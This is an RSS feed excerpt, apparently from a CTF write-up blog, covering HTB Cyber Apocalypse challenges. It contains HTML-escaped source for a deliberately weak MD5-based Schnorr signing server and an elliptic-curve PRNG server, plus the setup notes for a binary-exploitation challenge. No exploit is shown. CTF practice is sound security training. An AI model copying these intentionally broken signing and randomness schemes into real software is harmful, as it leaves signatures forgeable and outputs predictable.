&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">rv&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">g&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">y&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ev&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">H&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">long_to_bytes&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">rv&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ev&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'[S]ign a message'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'[V]erify a signature'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'&amp;gt; '&lt;/span>&lt;span class="mtk1">).&lt;/span>&lt;span class="mtk8">upper&lt;/span>&lt;span class="mtk1">()[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">]&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">md5chnorr&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">MD5chnorr&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'g:'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">md5chnorr&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">g&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'y:'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">md5chnorr&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">y&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'p:'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">md5chnorr&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">_&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">range&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">3&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">()&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'S'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">bytes&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">fromhex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Enter message&amp;gt; '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">'I am the left hand'&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'No!'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">sig&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">md5chnorr&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">sign&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Signature:'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">sig&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">choice&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'V'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">bytes&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">fromhex&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Enter message&amp;gt; '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">int&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Enter s&amp;gt; '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">int&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Enter e&amp;gt; '&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">md5chnorr&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">verify&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1">, (&lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1">)):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">'I am the left hand'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Valid signature!'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Invalid signature!'&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'Invalid choice...'&lt;/span>&lt;span class="mtk1">)&lt;/span>


&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">__name__&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'__main__'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">signal&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">alarm&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">30&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="schnorr-signature">Schnorr signature&lt;/h2>
&lt;p>The challenge implements a signing server using &lt;a target="_blank" href="https://en.wikipedia.org/wiki/Schnorr_signature">Schnorr signature&lt;/a>. The algorithm to sign a message $m$ is the following:&lt;/p></description></item><item><title>Control Room</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/control-room/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/control-room/</guid><description>&lt;p>We are given a 64-bit binary called &lt;code>control_room&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">Arch: amd64-64-little
RELRO: &lt;span class="code-dark-yellow">Partial RELRO&lt;/span>
Stack: &lt;span class="code-dark-green">Canary found&lt;/span>
NX: &lt;span class="code-dark-green">NX enabled&lt;/span>
PIE: &lt;span class="code-dark-red">No PIE (0x400000)&lt;/span> 
RUNPATH: &lt;span class="code-dark-red">b'./glibc/'&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="setup-environment">Setup environment&lt;/h2>
&lt;p>We are also provided with the remote Glibc library:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">./libc.so.6&lt;/span>
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. 
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&amp;lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&amp;gt;.

&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">md5sum&lt;/span> &lt;span class="mtku">libc.so.6&lt;/span>
3d7240354d70ebbd11911187f1acd6e8 libc.so.6
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>First of all, it is useful to patch the binary so that it uses the provided Glibc. That way, when developing the exploit, it will presumably work on remote without any issue. Glibc 2.35 appears in Ubuntu 22.04. The best way to get the loader is to use Docker:&lt;/p></description></item><item><title>Converging Visions</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/converging-visions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/converging-visions/</guid><description>&lt;p>We are provided with the server source code in Python:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> secret &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">FLAG&lt;/span>&lt;span class="mtk1">, p, a, b&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> sage.all_cmdline &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>


&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">PRNG&lt;/span>&lt;span class="mtk1">:&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">p&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">mul1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">mul2&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mod&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">60897882583250395019290734183554677148448130569594&lt;/span>&lt;span class="mtk6">43481824909430411674443639248386564763122373451773&lt;/span>&lt;span class="mtk6">38158266041105992233408699669643665700905532400804&lt;/span>&lt;span class="mtk6">1039&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">exp&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">2&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mul1&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">mul1&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mul2&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">mul2&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">inc&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">int&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">from_bytes&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">'Coordinates lost in space'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">'big'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">seed&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> randint(&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mod&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">rotate&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">seed&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mul1&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">seed&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">3&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mul2&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">seed&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">inc&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mod&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">seed&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">pow&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">seed&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">exp&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mod&lt;/span>&lt;span class="mtk1">)&lt;/span>


&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Relic&lt;/span>&lt;span class="mtk1">:&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">p&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">b&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">E&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> EllipticCurve(GF(&lt;/span>&lt;span class="mtk9 mtki">p&lt;/span>&lt;span class="mtk1">), [&lt;/span>&lt;span class="mtk9 mtki">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">b&lt;/span>&lt;span class="mtk1">])&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">P&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">None&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">EP&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">None&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">p&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">prng&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">PRNG&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">p&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">b&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">setupPoints&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">x&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">x&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;gt;=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'Coordinate greater than curve modulus'&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">try&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">P&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">E&lt;/span>&lt;span class="mtk1">.lift_x(Integer(&lt;/span>&lt;span class="mtk9 mtki">x&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">EP&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">P&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">except&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'Point not on curve'&lt;/span>

